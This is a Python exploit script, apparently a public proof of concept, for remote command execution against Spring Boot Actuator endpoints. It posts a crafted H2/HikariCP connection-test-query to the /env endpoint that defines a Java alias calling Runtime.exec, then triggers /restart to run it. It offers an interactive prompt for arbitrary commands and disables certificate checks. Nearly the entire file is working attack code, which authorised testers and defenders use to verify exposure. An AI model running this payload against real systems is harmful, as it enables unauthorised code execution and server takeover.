import requests
import argparse
import json
import sys
from lxml import etree
import string
import random
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def spring_poc(url, command, version):
    if url[-1] != '/':
        url = url + '/'
    random_str = ''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k = 8))
    if version == 1:
        headers = {
            'Content-Type' : 'application/x-www-form-urlencoded'
        }
        data = """\
            spring.datasource.hikari.connection-test-query=CREATE ALIAS %s AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL %s('%s');\
            """ % (random_str, random_str, command)
    else:
        headers = {
            'Content-Type': "application/json"
        }
        data = """\
        {"name":"spring.datasource.hikari.connection-test-query","value":"CREATE ALIAS %s AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream());  if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL %s('%s');"}\
        """ % (random_str, random_str, command)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url = url+'env', data=data, headers=headers, timeout=10, verify=False)
        if command in response.text:
            print(colors.OKGREEN + 'hikari.connection-test-query  is successfully configured!' + colors.reset)
        else:
            print(colors.FAIL + 'hikari.connection-test-query configuration failed.' + colors.reset)

        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url = url+'restart', data="", headers=headers, timeout=10, verify=False)
        if response.status_code == 200:
             print(colors.OKGREEN + 'Actuator restarted successfully!' + colors.reset)
        else:
            print(colors.FAIL + 'Actuator failed to restart.' + colors.reset)
        print(colors.OKCYAN + 'The command has been successfully executed!' + colors.reset)
    except Exception as e:
        print(colors.FAIL + 'Request exception.' + colors.reset)


class colors:
    reset='\033[0m'
    red='\033[31m'
    green='\033[32m'
    orange='\033[33m'
    blue='\033[34m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

if __name__ == '__main__':
    banner = (colors.red + r"""
  _________            .__              ___________               
 /   _____/____________|__| ____    ____\_   _____/__  _________  
 \_____  \\____ \_  __ \  |/    \  / ___\|    __)_\  \/  /\____ \ 
 /        \  |_> >  | \/  |   |  \/ /_/  >        \>    < |  |_> >
/_______  /   __/|__|  |__|___|  /\___  /_______  /__/\_ \|   __/ 
        \/|__|                 \//_____/        \/      \/|__|   
    """+ "\n" + colors.blue + "vuln: " + colors.orange + "SpringCloud h2 database & hikaricp RCE" + "\n" \
        + colors.blue + "group: " + colors.green + "WgpSec Team" + "\t\t" + colors.reset \
        + colors.blue + "author: " + colors.green + "2h0ng" + "\n" + colors.reset)
    print(banner)

    
    ap = argparse.ArgumentParser()
    ap.add_argument("-u", "--url", required=True,
        help="Spring Actuator Endpoint absolute path, example: https://example.com/actuator/")
    ap.add_argument("-v", "--spring-version", required=False,
        help="Spring Boot Version, example: -v (1/2), default 2", default=2, type=int)
    args = vars(ap.parse_args())
    
    while True:
        command = input(colors.red + "$command:>> " + colors.reset)
        if command == 'exit':
            sys.exit(0)
        spring_poc(args['url'], command, args['spring_version'])




